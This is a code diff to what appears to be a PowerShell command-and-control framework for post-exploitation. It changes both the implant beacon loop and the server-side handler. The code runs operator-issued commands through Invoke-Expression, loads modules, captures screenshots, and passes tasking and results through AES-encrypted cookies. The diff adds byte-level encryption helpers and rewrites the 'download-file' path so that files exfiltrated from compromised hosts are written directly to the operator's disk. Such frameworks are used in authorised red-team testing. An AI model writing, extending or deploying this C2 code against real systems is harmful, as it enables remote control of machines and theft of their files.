@@ -173,7 +173,21 @@ function Decrypt-String
     $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
     [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
 }
-
+function Decrypt-String3
+{
+    param
+    (
+        [Object]
+        $key,
+        [Object]
+        $bytes
+    )
+    $IV = $bytes[0..15]
+    $aesManaged = Create-AesManagedObject $key $IV
+    $decryptor = $aesManaged.CreateDecryptor()
+    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
+    $unencryptedData
+}
 # download file function to convert from base64 in db to file
 function Download-File
 {
@@ -1161,7 +1175,13 @@ function Encrypt-String($key, $unencryptedString) {
     #$aesManaged.Dispose()
     [System.Convert]::ToBase64String($fullData)
 }
-
+function Encrypt-String3($key, $bytes) {
+    $aesManaged = Create-AesManagedObject $key
+    $encryptor = $aesManaged.CreateEncryptor()
+    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
+    [byte[]] $fullData = $aesManaged.IV + $encryptedData
+    $fullData
+}
 function Decrypt-String($key, $encryptedStringWithIV) {
     $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
     $IV = $bytes[0..15]
@@ -1230,7 +1250,7 @@ while($true)
                         $G=[guid]::NewGuid()
                         $Server = "$ServerClean/$RandomURI$G/?$URI"
                         $error.clear()
-                        if  ($i.ToLower().StartsWith("upload-file")) {
+                        if ($i.ToLower().StartsWith("upload-file")) {
                             try {
                                 $Output = Invoke-Expression $i | out-string
                                 $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
@@ -1242,7 +1262,14 @@ while($true)
                             } catch {
                                 $Output = "ErrorUpload: " + $error[0]
                             }
-                        } elseif  ($i.ToLower().StartsWith("loadmodule")) {
+                        } elseif ($i.ToLower().StartsWith("download-file")) {
+                            try {
+                                Invoke-Expression $i | Out-Null
+                            }
+                            catch {
+                                $Output = "ErrorLoadMod: " + $error[0]
+                            }
+                        } elseif ($i.ToLower().StartsWith("loadmodule")) {
                             try {
                                 $modulename = $i -replace "LoadModule",""
                                 $Output = Invoke-Expression $modulename | out-string  
@@ -1275,7 +1302,7 @@ while($true)
                         }
                     } 
             }
-            elseif  ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
+            elseif ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
                 try {
                 $Output = Invoke-Expression $ReadCommandClear | out-string
                 $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
@@ -1288,7 +1315,14 @@ while($true)
                     $Output = "ErrorUpload: " + $error[0]
                 }
 
-            } elseif  ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
+            } elseif ($ReadCommandClear.ToLower().StartsWith("download-file")) {
+                try {
+                    Invoke-Expression $ReadCommandClear | Out-Null
+                }
+                catch {
+                    $Output = "ErrorLoadMod: " + $error[0]
+                }
+            } elseif ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
                 try {
                 $modulename = $ReadCommandClear -replace "LoadModule",""
                 $Output = Invoke-Expression $modulename | out-string  
@@ -1392,7 +1426,6 @@ $message =[Convert]::ToBase64String($Bytes)
                 }
                 Invoke-SqliteQuery -DataSource $Database -Query "DELETE FROM NewTasks WHERE RandomURI='$ranuri' and TaskID='$taskidtime'"|out-null
             }
-
             if ($multicmdresults.Count -gt 1){
                 $message = "multicmd" + $message
             }
@@ -1443,14 +1476,35 @@ $message =[Convert]::ToBase64String($Bytes)
             $encryptedString = $buffer[1500..$size2]
             $cookiesin = $request.Cookies -replace 'SessionID=', ''
             $cookieplaintext = Decrypt-String $key $cookiesin          
-            
-            try {
-            $backToPlainText = Decrypt-String2 $key $encryptedString
-            }
-            catch{             
-            $backToPlainText = "Unable to decrypt message from host"
-            $error.clear()
-            $cookieplaintext = "Unable to decrypt message from host: $cookieplaintext. Could be too large and truncating data!"
+  
+            # if the task was to download a file, dump it directly to disk
+            if  ($cookieplaintext.tolower().startswith('download-file'))
+            {
+                try {
+                $filebytes = Decrypt-String3 $key $encryptedString
+                $file = $cookieplaintext -replace "download-file ",""
+                $ramdomfilename = Get-RandomURI -Length 5
+                $targetfile = "$global:newdir\downloads\$($file)"
+                
+                $wStream = new-object IO.FileStream $targetfile, ([System.IO.FileMode]::Append), ([IO.FileAccess]::Write), ([IO.FileShare]::Read)
+                $wStream.Write($filebytes, 0, $filebytes.Length)
+                $wStream.Close()
+
+                $backToPlainText = "Downloaded file: $targetfile 123456<>654321"
+                } catch {
+                Echo $error[0]
+                Write-Host "File not downloaded, the size could be too large or the user may not have permissions!" -ForegroundColor Red
+                $backToPlainText = "Downloaded file: $targetfile 123456<>654321"
+                }
+            } else {           
+                try {
+                    $backToPlainText = Decrypt-String2 $key $encryptedString
+                }
+                catch{             
+                    $backToPlainText = "Unable to decrypt message from host"
+                    $error.clear()
+                    $cookieplaintext = "Unable to decrypt message from host: $cookieplaintext. Could be too large and truncating data!"
+                }
             }
             
             # if the task was a screenshot, dump it directly to disk
@@ -1475,26 +1529,6 @@ $message =[Convert]::ToBase64String($Bytes)
                 Write-Host "Screenshot not captured, the screen could be locked or this user does not have access to the screen!" -ForegroundColor Red
                 }
                 $backToPlainText = "Captured Screenshot: $global:newdir\downloads\$randomimageid.png 123456<>654321"
-            }
-            # if the task was to download a file, dump it directly to disk
-            if  ($cookieplaintext.tolower().startswith('download-file'))
-            {
-                try {
-                $file = split-path $cookieplaintext -leaf
-                $file = $file -replace "'", ""
-                $fileext = $file.split('\.')[-1]
-                $filename = $file.split('\.')[0]
-                $ramdomfilename = Get-RandomURI -Length 5
-                $targetfile = "$global:newdir\downloads\$($filename)__$($ramdomfilename).$($fileext)"   
-                $backToPlainText = $backToPlainText -replace '123456(.+?)654321', ''        
-                $fileBytes = [Convert]::FromBase64String($backToPlainText)
-                [io.file]::WriteAllBytes($targetfile, $fileBytes)
-                write-host "Downloaded file: $targetfile" -ForegroundColor Green
-
-                } catch {
-                Write-Host "File not downloaded, the size could be too large or the user may not have permissions!" -ForegroundColor Red
-                }
-                $backToPlainText = "Downloaded file: $targetfile 123456<>654321"
             }
 
             if ($backToPlainText -match '123456(.+?)654321')
